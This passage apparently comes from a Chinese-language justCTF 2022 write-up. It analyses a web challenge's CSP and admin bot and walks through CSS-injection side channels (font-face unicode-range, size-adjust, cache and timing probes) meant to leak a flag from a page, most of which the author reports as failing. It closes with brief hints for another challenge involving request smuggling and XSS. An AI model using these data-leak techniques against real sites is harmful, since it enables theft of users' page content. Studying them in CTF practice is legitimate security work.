@@ -1,0 +1,222 @@
+可以很明顯看到 CSS injection（server 有擋最多 140 個字），還有 `<a>` 的 href 控制跟任意屬性新增。
+
+而 flag 就是 admin user，出現在更上面的地方，內容長這樣：
+
+``` html
+<div class="nickname">Hello, <span>A</span><span>e</span><span>f</span><span>2</span><span>i</span><span>k</span><span>o</span><span>f</span><span>j</span><span>2</span><span>o</span><span>i</span><span>f</span><span>1</span><span>1</span><span>2</span><span>3</span><span>1</span><span>2</span><span>3</span><span>1</span>!</div>
+```
+
+![flag](/img/justctf-2022-writeup/p1.png)
+
+CSP 的話長這樣：
+
+> default-src 'none'; font-src http://ninja.web.jctf.pro/static/; form-action 'self'; object-src 'none'; script-src http://ninja.web.jctf.pro/static/; base-uri 'none'; style-src http://ninja.web.jctf.pro/static/ 'unsafe-inline'; img-src * data:;
+
+基本上只有 img 暢通無阻，其他都被擋掉。
+
+然後還有一個關鍵點是這題的 bot 裝了一個叫做 ninja cookie 的套件，從敘述看來是會自動去點擊不接受 cookie 的按鈕之類的，這題的 bot 也是很經典，擋了一大堆東西：
+
+``` python
+import traceback
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.by import By
+import os
+from flask import Flask, request
+import time
+
+
+app = Flask(__name__)
+
+import sys
+import logging
+
+TASK = os.environ.get('BASE_URL') or "http://127.0.0.1:5000"
+flag = os.environ.get('FLAG') or 'justCTF{fake}'
+pwd = os.environ.get('PASSWD') or 'admin'
+
+def visit_url(url, timeout):
+    if type(url) != str or not url.startswith("http"):
+        return
+    print("Visiting:",url, file=sys.stdout, flush=True)
+    options = Options()
+    options.add_argument('no-sandbox')
+    options.add_argument('disable-dev-shm-usage')
+    options.add_argument('disable-infobars')
+    options.add_argument('disable-background-networking')
+    options.add_argument('disable-default-apps')
+    options.add_argument('disable-gpu')
+    options.add_argument('disable-sync')
+    options.add_argument('disable-translate')
+    options.add_argument('disable-lazy-image-loading')
+    options.add_argument('hide-scrollbars')
+    options.add_argument('metrics-recording-only')
+    options.add_argument('mute-audio')
+    options.add_argument('no-first-run')
+    options.add_argument('dns-prefetch-disable')
+    options.add_argument('safebrowsing-disable-auto-update')
+    options.add_argument('media-cache-size=1')
+    options.add_argument('disk-cache-size=1')
+    options.add_argument('disable-features=LazyImageLoading,AutomaticLazyImageLoading,LazyFrameLoading,AutomaticLazyFrameLoading,AutoLazyLoadOnReloads')
+    options.add_argument('--js-flags=--noexpose_wasm,--jitless')
+    options.add_argument('hide-scrollbars')
+    options.add_argument('load-extension=ninja-cookie')
+
+    try:
+        browser = webdriver.Chrome('/usr/local/bin/chromedriver', options=options, service_args=['--verbose', '--log-path=/tmp/chromedriver.log'])
+
+        browser.get(TASK+"/login")
+        WebDriverWait(browser, 5).until(lambda r: r.execute_script('return document.readyState') == 'complete')
+        inputElement = browser.find_element_by_id("username")
+        inputElement.send_keys(flag)
+        inputElement = browser.find_element_by_id("password")
+        inputElement.send_keys(pwd)
+        browser.find_element_by_id("submit").click()
+        WebDriverWait(browser, 5).until(lambda r: r.execute_script('return document.readyState') == 'complete')
+        time.sleep(timeout)
+
+        browser.get(url)
+        WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
+        time.sleep(30)
+    except:
+        print('Error visiting', url, traceback.format_exc(), file=sys.stderr, flush=True)
+    finally:
+        print('Done visiting', url, file=sys.stderr, flush=True)
+
+@app.route("/", methods=['GET'])
+def visit():
+    visit_url(request.args.get("url"), 1)
+    return "ok"
+
+```
+
+先來講一下我看到這題之後的想法，因為 CSS injection 可以做，內容又在頁面上，所以自然而然會想到 `font-face` 搭配 `unicode-range` 的做法，像這樣：
+
+``` css
+@font-face {
+  font-family:"A";
+  src: url(https://example.com);
+  unicode-range: U+006A;
+}
+.nickname > span:nth-child(1) {
+  font-family: A1;
+}
+```
+
+這樣只要 flag 的第一個字是 `U+006A`，就會套用指定的字體，不過這邊字體被 CSP 限制不能載入，所以這招過不了。
+
+而我想到的另外一招是用 [size-adjust](https://web.dev/css-size-adjust/) 搭配 local font：
+
+``` css
+@font-face {
+  font-family:"A";
+  src: local(Arial);
+  size-adjust: 1000%;
+  unicode-range: U+006A;
+}
+.nickname > span:nth-child(1) {
+  font-family: A1;
+}
+```
+
+畫面會變成這樣：
+
+![original UI](/img/justctf-2022-writeup/p2.png)
+
+我原本的想法是，假設 ninja cookie 會偵測到「按鈕出現在畫面上」才去點擊，那我就可以用上面這招把按鈕推離畫面，ninja cookie 就不會點。然後如果字體沒有配對到，按鈕就不會被推走，就會點到按鈕。透過這個 oracle 來 leak 出 flag。
+
+不過有兩個問題，第一個問題是上面的截圖可以看到字體放大是往右跟往上長，推不到下面的內容。這個倒是好解決，我們用 CSS 更改一下排版，就可以讓版面橫著長：
+
+![adjusted UI](/img/justctf-2022-writeup/p3.png)
+
+第二個問題最為致命，那就是 ninja cookie 的 :visible 是指一個元素是否有寬高，有的話都是 visible，所以出不出現在畫面上是沒差的，因此這招就 gg 了。
+
+我想到的第二個招式是 cache probing，可以這樣寫：
+
+``` css
+@font-face {
+  font-family: "A1";
+  src: url(/static/bootstrap.min.css?q=1);
+  unicode-range: U+0041;
+}
+```
+
+如果有配對到，字體就會載入 `/static/bootstrap.min.css?q=1`，雖然說不會載入成功，但是瀏覽器應該會保存 cache，就算沒有 cache，也有 304 not modified 的機制，response 應該會比其他東西快。
+
+不過實測過後發現第一是速度其實沒差多少，第二是 bot 裡面用了 `disk-cache-size=1` 這個 flag，不得不說考慮的真是周到。
+
+順帶一提，常用的 scroll bar 跟 lazy loading image 也都被封掉了。
+
+我想到的第三招是我們可以這樣做：
+
+``` css
+@font-face {
+  font-family: "A1";
+  src: url(/static/bootstrap.min.css?q=1), 
+    url(/static/bootstrap.min.css?q=2),
+    ....
+    url(/static/bootstrap.min.css?q=500);
+  unicode-range: U+0041;
+}
+```
+
+因為 bot 的程式碼是長這樣：
+
+``` python
+browser.get(url)
+WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
+time.sleep(30)
+```
+
+假設字體沒有配對到，那造訪 bot 後拿到 response 時間應該是 30 秒上下。如果有配對到，就會發出一堆 request 去拿字體，network 就會一直有東西，就會更晚才符合停止條件，拿到 response 的時間就會更久。
+
+所以從 response 時間可以得到有沒有配對成功。
+
+但這招也行不通，因為 CSS 最多只能 140 個字。
+
+還有其他招我沒有去試的，例如說可以結合一開始提到的 `size-adjust` 跟 animation，有符合的話就一直瘋狂切換字體，像這樣：
+
+``` css
+@keyframes t {
+    0% { font-family: A1; }
+    50% { font-family: rest; }
+}
+@font-face {
+  font-family: "A1";
+  size-adjust: 1000%;
+  src: local(Arial);
+  unicode-range: U+0041;
+}
+.nickname > span:nth-child(1) {
+  font-family: A1;
+  animation: 0.01s t 0 infinite; 
+}
+```
+
+這樣一直切換字體，寬度就會一直變，layout 就要一直重排，應該會比較耗效能，只要能找到方式偵測這點就行了。
+
+第一種可能是 ninja cookie 點擊的速度會變慢，但想了想 extension 應該是別的 thread 在負責，雖然沒測過就是了。第二種可能是 iframe 把網站跟自己的 exploit 疊起來，再用一些 JS 去算這件事，但因為這題有擋 iframe 所以也無法。
+
+總之呢，這只是個想法而已，但要實作或是要成功應該還有一段距離。
+
+底下來講一下官方解法，利用了 `:target` 這個 selector 搭配 `:before` 來載入背景圖片。
+
+我知道有 [::target-text](https://developer.mozilla.org/en-US/docs/Web/CSS/::target-text) 來配對到 highlight 的部分，但之前看過只有部分屬性可以用，不知道原來 `:target` 也會配對到。
+
+所以這題解法就是利用 `:target:before` 來載入圖片，然後用 HTML injection + ninja cookie 的點擊來觸發 scroll。
+
+完整解法可看：https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb
+
+相關技術可看：[New technique of stealing data using CSS and Scroll-to-Text Fragment feature.](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)
+
+## Dank Shark(0 solves)
+
+這題完全沒看，不太知道在幹嘛，以後有機會再回來看（雖然這樣寫就代表九成九不會再回來看）。
+
+先附一下 [discord](https://discord.com/channels/656258740252704788/978312189159030805/985647413832323153) 中討論串的解法：
+
+1. use 0day request smugling in js_challange module
+2. just write short 64length xss in nickname (iptables was not working on remote)
+3. use cache poisoning/golang sync.pool buffer bug (if you close http connection without reading you have leak in next connection)
